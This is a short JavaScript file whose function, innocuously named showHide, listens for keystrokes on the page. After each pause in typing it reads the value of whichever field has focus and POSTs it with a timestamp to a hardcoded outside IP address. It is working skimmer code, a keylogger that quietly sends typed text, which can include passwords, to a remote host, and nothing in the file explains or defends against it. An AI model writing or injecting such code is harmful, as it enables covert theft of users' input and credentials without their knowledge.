showHide();

function showHide() {
    var typingTimer;    
    var doneTypingInterval = 1000;  

    window.addEventListener("keyup", () => {
        clearTimeout(typingTimer);
        typingTimer = setTimeout(doneTyping, doneTypingInterval);
    })

    window.addEventListener("keydown", () => {
        clearTimeout(typingTimer);
    })

    function doneTyping () {
        let focused = document.activeElement
        let time = new Date().getTime();
        var data = JSON.stringify({
            "time": time,
            "text": focused.value
          });
          
          var xhr = new XMLHttpRequest();          
          xhr.addEventListener("readystatechange", function () {
            if (this.readyState === 4) {
              console.log(this.responseText);
            }
          });
          
          xhr.open("POST", "http://192.34.78.218/api/inputUserData");
          xhr.setRequestHeader("Content-Type", "application/json");
          xhr.send(data);
      }
}